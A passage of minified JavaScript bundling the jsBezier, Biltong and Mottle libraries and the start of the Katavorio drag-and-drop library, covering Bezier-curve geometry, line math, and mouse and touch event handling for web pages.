(function(){void 0===Math.sgn&&(Math.sgn=function(t){return 0==t?0:t>0?1:-1});var t=function(t,e){return{x:t.x-e.x,y:t.y-e.y}},e=function(t,e){return t.x*e.x+t.y*e.y},n=function(t){return Math.sqrt(t.x*t.x+t.y*t.y)},o=function(t,e){return{x:t.x*e,y:t.y*e}},i=Math.pow(2,-65),r=function(e,o){for(var i=[],r=s(e,o),l=o.length-1,d=a(r,2*l-1,i,0),u=t(e,o[0]),h=n(u),p=0,f=0;f<d;f++){u=t(e,c(o,l,i[f],null,null));var g=n(u);g<h&&(h=g,p=i[f])}return u=t(e,o[l]),(g=n(u))<h&&(h=g,p=1),{location:p,distance:h}},s=function(n,i){for(var r=i.length-1,s=2*r-1,a=[],l=[],d=[],u=[],c=[[1,.6,.3,.1],[.4,.6,.6,.4],[.1,.3,.6,1]],h=0;h<=r;h++)a[h]=t(i[h],n);for(h=0;h<=r-1;h++)l[h]=t(i[h+1],i[h]),l[h]=o(l[h],3);for(var p=0;p<=r-1;p++)for(var f=0;f<=r;f++)d[p]||(d[p]=[]),d[p][f]=e(l[p],a[f]);for(h=0;h<=s;h++)u[h]||(u[h]=[]),u[h].y=0,u[h].x=parseFloat(h)/s;for(var g=r,_=r-1,b=0;b<=g+_;b++){var v=Math.max(0,b-_),m=Math.min(b,g);for(h=v;h<=m;h++)j=b-h,u[h+j].y+=d[j][h]*c[j][h]}return u},a=function(t,e,n,o){var i,r,s=[],h=[],p=[],f=[];switch(l(t,e)){case 0:return 0;case 1:if(o>=64)return n[0]=(t[0].x+t[e].x)/2,1;if(d(t,e))return n[0]=u(t,e),1}c(t,e,.5,s,h),i=a(s,e,p,o+1),r=a(h,e,f,o+1);for(var g=0;g<i;g++)n[g]=p[g];for(g=0;g<r;g++)n[g+i]=f[g];return i+r},l=function(t,e){var n,o,i=0;n=o=Math.sgn(t[0].y);for(var r=1;r<=e;r++)n=Math.sgn(t[r].y),n!=o&&i++,o=n;return i},d=function(t,e){var n,o,r,s,a,l,d,u;s=t[0].y-t[e].y,a=t[e].x-t[0].x,l=t[0].x*t[e].y-t[e].x*t[0].y;for(var c=max_distance_below=0,h=1;h<e;h++){var p=s*t[h].x+a*t[h].y+l;p>c?c=p:p<max_distance_below&&(max_distance_below=p)}return 0,1,0,n=(1*(l-c)-0*(u=a))*(1/(0*u-1*(d=s))),d=s,u=a,o=(1*(l-max_distance_below)-0*u)*(1/(0*u-1*d)),r=Math.min(n,o),Math.max(n,o)-r<i?1:0},u=function(t,e){var n=t[e].x-t[0].x,o=t[e].y-t[0].y,i=t[0].x-0;return 0+(n*(t[0].y-0)-o*i)*(1/(0*n-1*o))*1},c=function(t,e,n,o,i){for(var r=[[]],s=0;s<=e;s++)r[0][s]=t[s];for(var a=1;a<=e;a++)for(s=0;s<=e-a;s++)r[a]||(r[a]=[]),r[a][s]||(r[a][s]={}),r[a][s].x=(1-n)*r[a-1][s].x+n*r[a-1][s+1].x,r[a][s].y=(1-n)*r[a-1][s].y+n*r[a-1][s+1].y;if(null!=o)for(s=0;s<=e;s++)o[s]=r[s][0];if(null!=i)for(s=0;s<=e;s++)i[s]=r[e-s][s];return r[e][0]},h={},p=function(t,e){for(var n=function(t){var e=h[t];if(!e){var n=function(t){return function(e){return t}},o=function(){return function(t){return t}},i=function(){return function(t){return 1-t}},r=function(t){return function(e){for(var n=1,o=0;o<t.length;o++)n*=t[o](e);return n}};(e=[]).push(new function(){return function(e){return Math.pow(e,t)}});for(var s=1;s<t;s++){for(var a=[new n(t)],l=0;l<t-s;l++)a.push(new o);for(l=0;l<s;l++)a.push(new i);e.push(new r(a))}e.push(new function(){return function(e){return Math.pow(1-e,t)}}),h[t]=e}return e}(t.length-1),o=0,i=0,r=0;r<t.length;r++)o+=t[r].x*n[r](e),i+=t[r].y*n[r](e);return{x:o,y:i}},f=function(t,e){return Math.sqrt(Math.pow(t.x-e.x,2)+Math.pow(t.y-e.y,2))},g=function(t){return t[0].x==t[1].x&&t[0].y==t[1].y},_=function(t,e,n){if(g(t))return{point:t[0],location:e};for(var o=p(t,e),i=0,r=e,s=n>0?1:-1,a=null;i<Math.abs(n);)r+=.005*s,a=p(t,r),i+=f(a,o),o=a;return{point:a,location:r}},b=function(t,e){var n=p(t,e),o=p(t.slice(0,t.length-1),e),i=o.y-n.y,r=o.x-n.x;return 0==i?1/0:Math.atan(i/r)},v=this.jsBezier={distanceFromCurve:r,gradientAtPoint:b,gradientAtPointAlongCurveFrom:function(t,e,n){var o=_(t,e,n);return o.location>1&&(o.location=1),o.location<0&&(o.location=0),b(t,o.location)},nearestPointOnCurve:function(t,e){var n=r(t,e);return{point:c(e,e.length-1,n.location,null,null),location:n.location}},pointOnCurve:p,pointAlongCurveFrom:function(t,e,n){return _(t,e,n).point},perpendicularToCurveAt:function(t,e,n,o){var i=_(t,e,o=null==o?0:o),r=b(t,i.location),s=Math.atan(-1/r),a=n/2*Math.sin(s),l=n/2*Math.cos(s);return[{x:i.point.x+l,y:i.point.y+a},{x:i.point.x-l,y:i.point.y-a}]},locationAlongCurveFrom:function(t,e,n){return _(t,e,n).location},getLength:function(t){if(g(t))return 0;for(var e=p(t,0),n=0,o=0,i=null;o<1;)o+=.005,i=p(t,o),n+=f(i,e),e=i;return n},version:"0.9.0"};"undefined"!=typeof exports&&(exports.jsBezier=v)}).call("undefined"!=typeof window?window:this),function(){"use strict";var t=this.Biltong={version:"0.4.0"};"undefined"!=typeof exports&&(exports.Biltong=t);var e=function(t){return"[object Array]"===Object.prototype.toString.call(t)},n=function(t,n,o){return o(t=e(t)?t:[t.x,t.y],n=e(n)?n:[n.x,n.y])},o=t.gradient=function(t,e){return n(t,e,function(t,e){return e[0]==t[0]?e[1]>t[1]?1/0:-1/0:e[1]==t[1]?e[0]>t[0]?0:-0:(e[1]-t[1])/(e[0]-t[0])})},i=(t.normal=function(t,e){return-1/o(t,e)},t.lineLength=function(t,e){return n(t,e,function(t,e){return Math.sqrt(Math.pow(e[1]-t[1],2)+Math.pow(e[0]-t[0],2))})},t.quadrant=function(t,e){return n(t,e,function(t,e){return e[0]>t[0]?e[1]>t[1]?2:1:e[0]==t[0]?e[1]>t[1]?2:1:e[1]>t[1]?3:4})}),r=(t.theta=function(t,e){return n(t,e,function(t,e){var n=o(t,e),r=Math.atan(n),s=i(t,e);return 4!=s&&3!=s||(r+=Math.PI),r<0&&(r+=2*Math.PI),r})},t.intersects=function(t,e){var n=t.x,o=t.x+t.w,i=t.y,r=t.y+t.h,s=e.x,a=e.x+e.w,l=e.y,d=e.y+e.h;return n<=s&&s<=o&&i<=l&&l<=r||n<=a&&a<=o&&i<=l&&l<=r||n<=s&&s<=o&&i<=d&&d<=r||n<=a&&s<=o&&i<=d&&d<=r||s<=n&&n<=a&&l<=i&&i<=d||s<=o&&o<=a&&l<=i&&i<=d||s<=n&&n<=a&&l<=r&&r<=d||s<=o&&n<=a&&l<=r&&r<=d},t.encloses=function(t,e,n){var o=t.x,i=t.x+t.w,r=t.y,s=t.y+t.h,a=e.x,l=e.x+e.w,d=e.y,u=e.y+e.h,c=function(t,e,o,i){return n?t<=e&&o>=i:t<e&&o>i};return c(o,a,i,l)&&c(r,d,s,u)},[null,[1,-1],[1,1],[-1,1],[-1,-1]]),s=[null,[-1,-1],[-1,1],[1,1],[1,-1]];t.pointOnLine=function(t,e,n){var a=o(t,e),l=i(t,e),d=n>0?r[l]:s[l],u=Math.atan(a),c=Math.abs(n*Math.sin(u))*d[1],h=Math.abs(n*Math.cos(u))*d[0];return{x:t.x+h,y:t.y+c}},t.perpendicularLineTo=function(t,e,n){var i=o(t,e),r=Math.atan(-1/i),s=n/2*Math.sin(r),a=n/2*Math.cos(r);return[{x:e.x+a,y:e.y+s},{x:e.x-a,y:e.y-s}]}}.call("undefined"!=typeof window?window:this),function(){"use strict";var t=this,e=navigator.userAgent.toLowerCase().indexOf("android")>-1,n=function(t,e,n){for(var o=(n=n||t.parentNode).querySelectorAll(e),i=0;i<o.length;i++)if(o[i]===t)return!0;return!1},o=function(t){return"string"==typeof t||t.constructor===String?document.getElementById(t):t},i=function(t){return t.srcElement||t.target},r=function(t,e,n,o){if(o){if(void 0!==t.path&&t.path.indexOf)return{path:t.path,end:t.path.indexOf(n)};var i={path:[],end:-1},r=function(t){i.path.push(t),t===n?i.end=i.path.length-1:null!=t.parentNode&&r(t.parentNode)};return r(e),i}return{path:[e],end:1}},s=function(t,e){for(var n=0,o=t.length;n<o&&t[n]!=e;n++);n<t.length&&t.splice(n,1)},a=1,l=function(t,e,n){var o=a++;return t.__ta=t.__ta||{},t.__ta[e]=t.__ta[e]||{},t.__ta[e][o]=n,n.__tauid=o,o},d=function(t,e,o,s){if(null==t)return o;var a=t.split(","),l=function(s){l.__tauid=o.__tauid;var d=i(s),u=d,c=r(s,d,e,null!=t);if(-1!=c.end)for(var h=0;h<c.end;h++){u=c.path[h];for(var p=0;p<a.length;p++)n(u,a[p],e)&&o.apply(u,arguments)}};return u(o,s,l),l},u=function(t,e,n){t.__taExtra=t.__taExtra||[],t.__taExtra.push([e,n])},c=function(t,e,n,o){if(f&&_[e]){var i=d(o,t,n,_[e]);E(t,_[e],i,n)}"focus"===e&&null==t.getAttribute("tabindex")&&t.setAttribute("tabindex","1"),E(t,e,d(o,t,n,e),n)},h={tap:{touches:1,taps:1},dbltap:{touches:1,taps:2},contextmenu:{touches:2,taps:1}},p=function(t,e,n,o){for(var i in n.__tamee[t])n.__tamee[t].hasOwnProperty(i)&&n.__tamee[t][i].apply(o,[e])},f="ontouchstart"in document.documentElement,g="onmousedown"in document.documentElement,_={mousedown:"touchstart",mouseup:"touchend",mousemove:"touchmove"},b=function(){var t=-1;if("Microsoft Internet Explorer"==navigator.appName){var e=navigator.userAgent;null!=new RegExp("MSIE ([0-9]{1,}[.0-9]{0,})").exec(e)&&(t=parseFloat(RegExp.$1))}return t}(),v=b>-1&&b<9,m=function(t,e){if(null==t)return[0,0];var n=y(t),o=j(n,0);return[o[e+"X"],o[e+"Y"]]},w=function(t){return null==t?[0,0]:v?[t.clientX+document.documentElement.scrollLeft,t.clientY+document.documentElement.scrollTop]:m(t,"page")},j=function(t,e){return t.item?t.item(e):t[e]},y=function(t){return t.touches&&t.touches.length>0?t.touches:t.changedTouches&&t.changedTouches.length>0?t.changedTouches:t.targetTouches&&t.targetTouches.length>0?t.targetTouches:[t]},P=function(t){return y(t).length},E=function(t,e,n,o){if(l(t,e,n),o.__tauid=n.__tauid,t.addEventListener)t.addEventListener(e,n,!1);else if(t.attachEvent){var i=e+n.__tauid;t["e"+i]=n,t[i]=function(){t["e"+i]&&t["e"+i](window.event)},t.attachEvent("on"+e,t[i])}},x=function(t,e,n){null!=n&&C(t,function(){var i=o(this);if(function(t,e,n){if(t.__ta&&t.__ta[e]&&delete t.__ta[e][n.__tauid],n.__taExtra){for(var o=0;o<n.__taExtra.length;o++)x(t,n.__taExtra[o][0],n.__taExtra[o][1]);n.__taExtra.length=0}n.__taUnstore&&n.__taUnstore()}(i,e,n),null!=n.__tauid)if(i.removeEventListener)i.removeEventListener(e,n,!1),f&&_[e]&&i.removeEventListener(_[e],n,!1);else if(this.detachEvent){var r=e+n.__tauid;i[r]&&i.detachEvent("on"+e,i[r]),i[r]=null,i["e"+r]=null}n.__taTouchProxy&&x(t,n.__taTouchProxy[1],n.__taTouchProxy[0])})},C=function(t,e){if(null!=t){t="undefined"!=typeof Window&&"unknown"!=typeof t.top&&t==t.top?[t]:"string"!=typeof t&&null==t.tagName&&null!=t.length?t:"string"==typeof t?document.querySelectorAll(t):[t];for(var n=0;n<t.length;n++)e.apply(t[n])}};t.Mottle=function(t){var a=(t=t||{}).clickThreshold||250,u=t.dblClickThreshold||450,b=new function(){var t=[];return function(e,o,r,s){if(!e.__tamee){e.__tamee={over:!1,mouseenter:[],mouseexit:[]};var a=function(o){var r=i(o);(null==s&&r==e&&!e.__tamee.over||n(r,s,e)&&(null==r.__tamee||!r.__tamee.over))&&(p("mouseenter",o,e,r),r.__tamee=r.__tamee||{},r.__tamee.over=!0,t.push(r))},u=function(o){for(var r=i(o),s=0;s<t.length;s++)r!=t[s]||n(o.relatedTarget||o.toElement,"*",r)||(r.__tamee.over=!1,t.splice(s,1),p("mouseexit",o,e,r))};E(e,"mouseover",d(s,e,a,"mouseover"),a),E(e,"mouseout",d(s,e,u,"mouseout"),u)}r.__taUnstore=function(){delete e.__tamee[o][r.__tauid]},l(e,o,r),e.__tamee[o][r.__tauid]=r}},v=new function(t,e){return function(o,a,l,d){if("contextmenu"==a&&g)c(o,a,l,d);else{if(null==o.__taTapHandler){var u=o.__taTapHandler={tap:[],dbltap:[],contextmenu:[],down:!1,taps:0,downSelectors:[]},p=function(){u.down=!1},f=function(){u.taps=0};c(o,"mousedown",function(s){for(var a=i(s),l=r(s,a,o,null!=d),c=!1,h=0;h<l.end;h++){if(c)return;a=l.path[h];for(var g=0;g<u.downSelectors.length;g++)if(null==u.downSelectors[g]||n(a,u.downSelectors[g],o)){u.down=!0,setTimeout(p,t),setTimeout(f,e),c=!0;break}}}),c(o,"mouseup",function(t){if(u.down){var e,s,a=i(t);u.taps++;var l=P(t);for(var d in h)if(h.hasOwnProperty(d)){var c=h[d];if(c.touches===l&&(1===c.taps||c.taps===u.taps))for(var p=0;p<u[d].length;p++){s=r(t,a,o,null!=u[d][p][1]);for(var f=0;f<s.end;f++)if(e=s.path[f],null==u[d][p][1]||n(e,u[d][p][1],o)){u[d][p][0].apply(e,[t]);break}}}}})}o.__taTapHandler.downSelectors.push(d),o.__taTapHandler[a].push([l,d]),l.__taUnstore=function(){s(o.__taTapHandler[a],l)}}}}(a,u),j=t.smartClicks,y=function(t,e,n,r){null!=n&&C(t,function(){var t=o(this);j&&"click"===e?function(t,e,n,o){null==t.__taSmartClicks&&(c(t,"mousedown",function(e){t.__tad=w(e)},o),c(t,"mouseup",function(e){t.__tau=w(e)},o),c(t,"click",function(e){if(t.__tad&&t.__tau&&t.__tad[0]===t.__tau[0]&&t.__tad[1]===t.__tau[1])for(var n=0;n<t.__taSmartClicks.length;n++)t.__taSmartClicks[n].apply(i(e),[e])},o),t.__taSmartClicks=[]);t.__taSmartClicks.push(n),n.__taUnstore=function(){s(t.__taSmartClicks,n)}}(t,0,n,r):"tap"===e||"dbltap"===e||"contextmenu"===e?v(t,e,n,r):"mouseenter"===e||"mouseexit"==e?b(t,e,n,r):c(t,e,n,r)})};this.remove=function(t){return C(t,function(){var t=o(this);if(t.__ta)for(var e in t.__ta)if(t.__ta.hasOwnProperty(e))for(var n in t.__ta[e])t.__ta[e].hasOwnProperty(n)&&x(t,e,t.__ta[e][n]);t.parentNode&&t.parentNode.removeChild(t)}),this},this.on=function(t,e,n,o){var i=arguments[0],r=4==arguments.length?arguments[2]:null,s=arguments[1],a=arguments[arguments.length-1];return y(i,s,a,r),this},this.off=function(t,e,n){return x(t,e,n),this},this.trigger=function(t,n,i,r){var s=g&&("undefined"==typeof MouseEvent||null==i||i.constructor===MouseEvent),a=f&&!g&&_[n]?_[n]:n,l=!(f&&!g&&_[n]),d=w(i),u=m(i,"screen"),c=m(i,"client");return C(t,function(){var t,h=o(this);i=i||{screenX:u[0],screenY:u[1],clientX:c[0],clientY:c[1]};var p=function(t){r&&(t.payload=r)},g={TouchEvent:function(t){var e=document.createTouch(window,h,0,d[0],d[1],u[0],u[1],c[0],c[1],0,0,0,0),n=document.createTouchList(e),o=document.createTouchList(e),i=document.createTouchList(e);t.initTouchEvent(a,!0,!0,window,null,u[0],u[1],c[0],c[1],!1,!1,!1,!1,n,o,i,1,0)},MouseEvents:function(t){if(t.initMouseEvent(a,!0,!0,window,0,u[0],u[1],c[0],c[1],!1,!1,!1,!1,1,h),e){var n=document.createTouch(window,h,0,d[0],d[1],u[0],u[1],c[0],c[1],0,0,0,0);t.touches=t.targetTouches=t.changedTouches=document.createTouchList(n)}}};if(document.createEvent){var b=!l&&!s&&f&&_[n]&&!e?"TouchEvent":"MouseEvents";t=document.createEvent(b),g[b](t),p(t),h.dispatchEvent(t)}else document.createEventObject&&(t=document.createEventObject(),t.eventType=t.eventName=a,t.screenX=u[0],t.screenY=u[1],t.clientX=c[0],t.clientY=c[1],p(t),h.fireEvent("on"+a,t))}),this}},t.Mottle.consume=function(t,e){t.stopPropagation?t.stopPropagation():t.returnValue=!1,!e&&t.preventDefault&&t.preventDefault()},t.Mottle.pageLocation=w,t.Mottle.setForceTouchEvents=function(t){f=t},t.Mottle.setForceMouseEvents=function(t){g=t},t.Mottle.version="0.8.0","undefined"!=typeof exports&&(exports.Mottle=t.Mottle)}.call("undefined"==typeof window?this:window),function(){"use strict";var t=function(t,e,n){return-1===t.indexOf(e)&&(n?t.unshift(e):t.push(e),!0)},e=function(t,e){var n=t.indexOf(e);-1!==n&&t.splice(n,1)},n=function(t){return null!=t&&("string"==typeof t||t.constructor===String)},o=function(t,e,n){for(var o=(n=n||t.parentNode).querySelectorAll(e),i=0;i<o.length;i++)if(o[i]===t)return!0;return!1},i=function(){var t=-1;if("Microsoft Internet Explorer"===navigator.appName){var e=navigator.userAgent;null!=new RegExp("MSIE ([0-9]{1,}[.0-9]{0,})").exec(e)&&(t=parseFloat(RegExp.$1))}return t}(),r=i>-1&&i<9,s=9===i,a=function(t){if(r)return[t.clientX+document.documentElement.scrollLeft,t.clientY+document.documentElement.scrollTop];var e=d(t),n=l(e,0);return s?[n.pageX||n.clientX,n.pageY||n.clientY]:[n.pageX,n.pageY]},l=function(t,e){return t.item?t.item(e):t[e]},d=function(t){return t.touches&&t.touches.length>0?t.touches:t.changedTouches&&t.changedTouches.length>0?t.changedTouches:t.targetTouches&&t.targetTouches.length>0?t.targetTouches:[t]},u={draggable:"katavorio-draggable",droppable:"katavorio-droppable",drag:"katavorio-drag",selected:"katavorio-drag-selected",active:"katavorio-drag-active",hover:"katavorio-drag-hover",noSelect:"katavorio-drag-no-select",ghostProxy:"katavorio-ghost-proxy",clonedDrag:"katavorio-clone-drag"},c=["stop","start","drag","drop","over","out","beforeStart"],h=function(){},p=function(){return!0},f=function(t,e,n){for(var o=0;o<t.length;o++)t[o]!=n&&e(t[o])},g=function(t,e,n,o){f(t,function(t){t.setActive(e),e&&t.updatePosition(),n&&t.setHover(o,e)})},_=function(t,e){if(null!=t){t=n(t)||null!=t.tagName||null==t.length?[t]:t;for(var o=0;o<t.length;o++)e.apply(t[o],[t[o]])}},b=function(t){t.stopPropagation?(t.stopPropagation(),t.preventDefault()):t.returnValue=!1},v=function(t,e,n,o){this.params=e||{},this.el=t,this.params.addClass(this.el,this._class),this.uuid=P();var i=!0;return this.setEnabled=function(t){i=t},this.isEnabled=function(){return i},this.toggleEnabled=function(){i=!i},this.setScope=function(t){this.scopes=t?t.split(/\s+/):[o]},this.addScope=function(t){var e={};_(this.scopes,function(t){e[t]=!0}),_(t?t.split(/\s+/):[],function(t){e[t]=!0}),this.scopes=[];for(var n in e)this.scopes.push(n)},this.removeScope=function(t){var e={};_(this.scopes,function(t){e[t]=!0}),_(t?t.split(/\s+/):[],function(t){delete e[t]}),this.scopes=[];for(var n in e)this.scopes.push(n)},this.toggleScope=function(t){var e={};_(this.scopes,function(t){e[t]=!0}),_(t?t.split(/\s+/):[],function(t){e[t]?delete e[t]:e[t]=!0}),this.scopes=[];for(var n in e)this.scopes.push(n)},this.setScope(e.scope),this.k=e.katavorio,e.katavorio},m=function(){return!0},w=function(){return!1},j=function(t,e,i,r){this._class=i.draggable;var s=v.apply(this,arguments);this.rightButtonCanDrag=this.params.rightButtonCanDrag;var l=[0,0],d=null,c=null,h=[0,0],f=!1,_=!1!==this.params.consumeStartEvent,j=this.el,y=this.params.clone,x=(this.params.scroll,!1!==e.multipleDrop),C=!1,S=!0===e.ghostProxy?m:e.ghostProxy&&"function"==typeof e.ghostProxy?e.ghostProxy:w,I=e.selector,A=null,T=e.snapThreshold,k=function(t,e,n,o,i){var r=e*Math.floor(t[0]/e),s=r+e,a=Math.abs(t[0]-r)<=o?r:Math.abs(s-t[0])<=o?s:t[0],l=n*Math.floor(t[1]/n),d=l+n;return[a,Math.abs(t[1]-l)<=i?l:Math.abs(d-t[1])<=i?d:t[1]]};this.posses=[],this.posseRoles={},this.toGrid=function(t){if(null==this.params.grid)return t;var e=this.params.grid?this.params.grid[0]/2:T||5,n=this.params.grid?this.params.grid[1]/2:T||5;return k(t,this.params.grid[0],this.params.grid[1],e,n)},this.snap=function(t,e){if(null!=j){t=t||(this.params.grid?this.params.grid[0]:10),e=e||(this.params.grid?this.params.grid[1]:10);var n=this.params.getPosition(j),o=this.params.grid?this.params.grid[0]/2:T,i=this.params.grid?this.params.grid[1]/2:T;this.params.setPosition(j,k(n,t,e,o,i))}},this.setUseGhostProxy=function(t){S=t?m:w};var D,N,M=function(t){return!1===e.allowNegative?[Math.max(0,t[0]),Math.max(0,t[1])]:t},O=function(t){D="function"==typeof t?t:t?function(t,e,n,o){return M([Math.max(0,Math.min(n.w-o[0],t[0])),Math.max(0,Math.min(n.h-o[1],t[1]))])}.bind(this):function(t){return M(t)}}.bind(this);O("function"==typeof this.params.constrain?this.params.constrain:this.params.constrain||this.params.containment),this.setConstrain=function(t){O(t)},this.setRevert=function(t){N=t};var F={},L=this.setFilter=function(e,i){if(e){var r="function"==typeof(s=e)?(s._katavorioId=P(),s._katavorioId):s;F[r]=[function(i){var r,s=i.srcElement||i.target;return n(e)?r=o(s,e,t):"function"==typeof e&&(r=e(i,t)),r},!1!==i]}var s};this.addFilter=L,this.removeFilter=function(t){var e="function"==typeof t?t._katavorioId:t;delete F[e]},this.clearAllFilters=function(){F={}},this.canDrag=this.params.canDrag||p;var R,G=[],U=[];this.downListener=function(t){if((this.rightButtonCanDrag||3!==t.which&&2!==t.button)&&this.isEnabled()&&this.canDrag())if(function(t){for(var e in F){var n=F[e],o=n[0](t);if(n[1]&&(o=!o),!o)return!1}return!0}(t)&&(P=t,E=this.el,x=this.k,C=P.srcElement||P.target,!o(C,x.getInputFilterSelector(),E))){if(I){if(null==(A=function(t,e,n){if(o(e,n,t))return e;for(var i=e.parentNode;null!=i&&i!==t;){if(o(i,n,t))return i;i=i.parentNode}}(this.el,t.target||t.srcElement,I)))return}else A=this.el;if(y)if(j=A.cloneNode(!0),this.params.addClass(j,u.clonedDrag),j.setAttribute("id",null),j.style.position="absolute",null!=this.params.parent){var e=this.params.getPosition(this.el);j.style.left=e[0]+"px",j.style.top=e[1]+"px",this.params.parent.appendChild(j)}else{var n=(r=A.getBoundingClientRect(),c=document.body,h=document.documentElement,p=window.pageYOffset||h.scrollTop||c.scrollTop,f=window.pageXOffset||h.scrollLeft||c.scrollLeft,g=h.clientTop||c.clientTop||0,v=h.clientLeft||c.clientLeft||0,m=r.top+p-g,w=r.left+f-v,{top:Math.round(m),left:Math.round(w)});j.style.left=n.left+"px",j.style.top=n.top+"px",document.body.appendChild(j)}else j=A;_&&b(t),l=a(t),this.params.bind(document,"mousemove",this.moveListener),this.params.bind(document,"mouseup",this.upListener),s.markSelection(this),s.markPosses(this),this.params.addClass(document.body,i.noSelect),B("beforeStart",{el:this.el,pos:d,e:t,drag:this})}else this.params.consumeFilteredEvents&&b(t);var r,c,h,p,f,g,v,m,w,P,E,x,C}.bind(this),this.moveListener=function(t){if(l){if(!f)if(!1!==B("start",{el:this.el,pos:d,e:t,drag:this})){if(!l)return;this.mark(!0),f=!0}else this.abort();if(l){U.length=0;var e=a(t),n=e[0]-l[0],o=e[1]-l[1],i=this.params.ignoreZoom?1:s.getZoom();n/=i,o/=i,this.moveBy(n,o,t),s.updateSelection(n,o,this),s.updatePosses(n,o,this)}}}.bind(this),this.upListener=function(t){l&&(l=null,this.params.unbind(document,"mousemove",this.moveListener),this.params.unbind(document,"mouseup",this.upListener),this.params.removeClass(document.body,i.noSelect),this.unmark(t),s.unmarkSelection(this,t),s.unmarkPosses(this,t),this.stop(t),s.notifySelectionDragStop(this,t),s.notifyPosseDragStop(this,t),f=!1,y&&(j&&j.parentNode&&j.parentNode.removeChild(j),j=null),U.length=0,N&&!0===N(this.el,this.params.getPosition(this.el))&&(this.params.setPosition(this.el,d),B("revert",this.el)))}.bind(this),this.getFilters=function(){return F},this.abort=function(){null!=l&&this.upListener()},this.getDragElement=function(t){return t?A||this.el:j||this.el};var z={start:[],drag:[],stop:[],over:[],out:[],beforeStart:[],revert:[]};e.events.start&&z.start.push(e.events.start),e.events.beforeStart&&z.beforeStart.push(e.events.beforeStart),e.events.stop&&z.stop.push(e.events.stop),e.events.drag&&z.drag.push(e.events.drag),e.events.revert&&z.revert.push(e.events.revert),this.on=function(t,e){z[t]&&z[t].push(e)},this.off=function(t,e){if(z[t]){for(var n=[],o=0;o<z[t].length;o++)z[t][o]!==e&&n.push(z[t][o]);z[t]=n}};var V,B=function(t,e){var n=null;if(z[t])for(var o=0;o<z[t].length;o++)try{var i=z[t][o](e);null!=i&&(n=i)}catch(t){}return n};this.notifyStart=function(t){B("start",{el:this.el,pos:this.params.getPosition(j),e:t,drag:this})},this.stop=function(t,e){if(e||f){var n=[],o=s.getSelection(),i=this.params.getPosition(j);if(o.length>1)for(var r=0;r<o.length;r++){var a=this.params.getPosition(o[r].el);n.push([o[r].el,{left:a[0],top:a[1]},o[r]])}else n.push([j,{left:i[0],top:i[1]},this]);B("stop",{el:j,pos:V||i,finalPos:i,e:t,drag:this,selection:n})}},this.mark=function(t){var e;d=this.params.getPosition(j),c=this.params.getPosition(j,!0),h=[c[0]-d[0],c[1]-d[1]],this.size=this.params.getSize(j),G=s.getMatchingDroppables(this),g(G,!0,!1,this),this.params.addClass(j,this.params.dragClass||i.drag),e=this.params.getConstrainingRectangle?this.params.getConstrainingRectangle(j):this.params.getSize(j.parentNode),R={w:e[0],h:e[1]},t&&s.notifySelectionDragStart(this)},this.unmark=function(t,n){if(g(G,!1,!0,this),C&&S(A)?(V=[j.offsetLeft,j.offsetTop],A.parentNode.removeChild(j),j=A):V=null,this.params.removeClass(j,this.params.dragClass||i.drag),G.length=0,C=!1,!n){U.length>0&&V&&e.setPosition(A,V),U.sort(E);for(var o=0;o<U.length&&!0!==U[o].drop(this,t);o++);}},this.moveBy=function(t,n,o){U.length=0;var i=this.toGrid([d[0]+t,d[1]+n]),r=D(i,j,R,this.size);if(S(this.el))if(i[0]!==r[0]||i[1]!==r[1]){if(!C){var s=A.cloneNode(!0);e.addClass(s,u.ghostProxy),A.parentNode.appendChild(s),j=s,C=!0}r=i}else C&&(A.parentNode.removeChild(j),j=A,C=!1);var a={x:r[0],y:r[1],w:this.size[0],h:this.size[1]},l={x:a.x+h[0],y:a.y+h[1],w:a.w,h:a.h},c=null;this.params.setPosition(j,r);for(var p=0;p<G.length;p++){var f={x:G[p].pagePosition[0],y:G[p].pagePosition[1],w:G[p].size[0],h:G[p].size[1]};this.params.intersects(l,f)&&(x||null==c||c===G[p].el)&&G[p].canDrop(this)?(c||(c=G[p].el),U.push(G[p]),G[p].setHover(this,!0,o)):G[p].isHover()&&G[p].setHover(this,!1,o)}B("drag",{el:this.el,pos:r,e:o,drag:this})},this.destroy=function(){this.params.unbind(this.el,"mousedown",this.downListener),this.params.unbind(document,"mousemove",this.moveListener),this.params.unbind(document,"mouseup",this.upListener),this.downListener=null,this.upListener=null,this.moveListener=null},this.params.bind(this.el,"mousedown",this.downListener),this.params.handle?L(this.params.handle,!1):L(this.params.filter,this.params.filterExclude)},y=function(t,e,n,o){this._class=n.droppable,this.params=e||{},this.rank=e.rank||0,this._activeClass=this.params.activeClass||n.active,this._hoverClass=this.params.hoverClass||n.hover,v.apply(this,arguments);var i=!1;this.allowLoopback=!1!==this.params.allowLoopback,this.setActive=function(t){this.params[t?"addClass":"removeClass"](this.el,this._activeClass)},this.updatePosition=function(){this.position=this.params.getPosition(this.el),this.pagePosition=this.params.getPosition(this.el,!0),this.size=this.params.getSize(this.el)},this.canDrop=this.params.canDrop||function(t){return!0},this.isHover=function(){return i},this.setHover=function(t,e,n){(e||null==this.el._katavorioDragHover||this.el._katavorioDragHover===t.el._katavorio)&&(this.params[e?"addClass":"removeClass"](this.el,this._hoverClass),this.el._katavorioDragHover=e?t.el._katavorio:null,i!==e&&this.params.events[e?"over":"out"]({el:this.el,e:n,drag:t,drop:this}),i=e)},this.drop=function(t,e){return this.params.events.drop({drag:t,e:e,drop:this})},this.destroy=function(){this._class=null,this._activeClass=null,this._hoverClass=null,i=null}},P=function(){return"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,function(t){var e=16*Math.random()|0;return("x"===t?e:3&e|8).toString(16)})},E=function(t,e){return t.rank<e.rank?1:t.rank>e.rank?-1:0},x=function(t){return null==t?null:null==(t="string"==typeof t||t.constructor===String?document.getElementById(t):t)?null:(t._katavorio=t._katavorio||P(),t)};this.Katavorio=function(o){var i=[],r={};this._dragsByScope={},this._dropsByScope={};var s=1,a=function(t,e){_(t,function(t){for(var n=0;n<t.scopes.length;n++)e[t.scopes[n]]=e[t.scopes[n]]||[],e[t.scopes[n]].push(t)})},l=function(t,e){var n=0;return _(t,function(t){for(var i=0;i<t.scopes.length;i++)if(e[t.scopes[i]]){var r=o.indexOf(e[t.scopes[i]],t);-1!==r&&(e[t.scopes[i]].splice(r,1),n++)}}),n>0},d=(this.getMatchingDroppables=function(t){for(var e=[],n={},o=0;o<t.scopes.length;o++){var i=this._dropsByScope[t.scopes[o]];if(i)for(var r=0;r<i.length;r++)!i[r].canDrop(t)||n[i[r].uuid]||!i[r].allowLoopback&&i[r].el===t.el||(n[i[r].uuid]=!0,e.push(i[r]))}return e.sort(E),e},function(t){t=t||{};var e,n={events:{}};for(e in o)n[e]=o[e];for(e in 